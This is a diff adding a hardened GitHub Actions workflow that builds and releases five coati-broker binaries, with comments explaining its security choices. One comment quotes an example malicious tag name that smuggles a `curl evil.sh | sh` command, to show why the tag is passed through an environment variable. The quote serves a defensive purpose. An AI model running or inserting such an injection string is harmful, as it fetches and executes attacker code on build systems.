@@ -1,0 +1,112 @@
+name: release
+
+# Goal G4 "binaries + Windows CI": tag a version (v0.1.0, v1.2.3, ...) to get
+# a GitHub release with the 5 standalone coati-broker binaries attached.
+# Cross-compiled all at once on ubuntu-latest via scripts/build-binaries.sh —
+# `bun build --compile --target=bun-<os>-<arch>` downloads each target's bun
+# runtime, no need for 5 separate runners.
+#
+# Split into two jobs on purpose (final security review): `build` only needs
+# read access to the repo and never sees a write-capable GITHUB_TOKEN; only
+# `release` — which does nothing but attach already-built artifacts to a
+# GitHub release — runs with `contents: write`. A compromised build step
+# (a malicious transitive dependency pulled in by `bun install`, for example)
+# can at most tamper with the uploaded artifact, never mint releases/tags/
+# repo content directly with its own token.
+on:
+  push:
+    tags:
+      - "v*"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          # This job never pushes/tags/releases — no reason for its checkout
+          # to hold a credential that could do so if the build step were ever
+          # compromised (final security review).
+          persist-credentials: false
+
+      - uses: oven-sh/setup-bun@v2
+        with:
+          bun-version: "1.4.2"
+
+      - name: bun install (broker)
+        run: bun install --frozen-lockfile
+        working-directory: broker
+
+      - name: bun test (broker)
+        run: bun test
+        working-directory: broker
+
+      - name: build all 5 binaries
+        run: bash scripts/build-binaries.sh
+
+      - name: --check-modules smoke (host target)
+        run: |
+          fakehome="$RUNNER_TEMP/coati-check-modules-home"
+          mkdir -p "$fakehome/.config/coati"
+          fixture="$PWD/broker/test/fixtures/modules/valid-provider.ts"
+          cat > "$fakehome/.config/coati/config.json" <<EOF
+          {
+            "port": 8787,
+            "allowedExtensionIds": [],
+            "provider": "ollama",
+            "ollamaUrl": "http://127.0.0.1:11434",
+            "modules": [{ "path": "$fixture", "options": { "id": "smoke-valid" } }]
+          }
+          EOF
+          HOME="$fakehome" dist/bin/coati-broker-linux-x64 --check-modules
+
+      - name: SHA256SUMS
+        working-directory: dist/bin
+        run: sha256sum coati-broker-* > SHA256SUMS
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: coati-broker-binaries
+          path: dist/bin/
+          if-no-files-found: error
+
+  release:
+    needs: build
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      # Contents-write scope stays on this job alone, and this job does
+      # nothing except download the artifact `build` already produced and
+      # hand it to `gh release create` — no `bun install`, no third-party
+      # code runs here at all.
+      - uses: actions/checkout@v5
+        with:
+          persist-credentials: false
+
+      - uses: actions/download-artifact@v4
+        with:
+          name: coati-broker-binaries
+          path: dist/bin
+
+      - name: create GitHub release
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Passed through env, never interpolated into the run: script
+          # itself (final security review): github.ref_name is attacker-
+          # controlled (it's the pushed tag name) and expanding it directly
+          # into the script body would let a tag like
+          # `v1"; curl evil.sh | sh; echo "` inject shell commands.
+          TAG: ${{ github.ref_name }}
+        run: |
+          gh release create "$TAG" \
+            --title "$TAG" \
+            --generate-notes \
+            dist/bin/coati-broker-linux-x64 \
+            dist/bin/coati-broker-linux-arm64 \
+            dist/bin/coati-broker-darwin-arm64 \
+            dist/bin/coati-broker-darwin-x64 \
+            dist/bin/coati-broker-windows-x64.exe \
+            dist/bin/SHA256SUMS
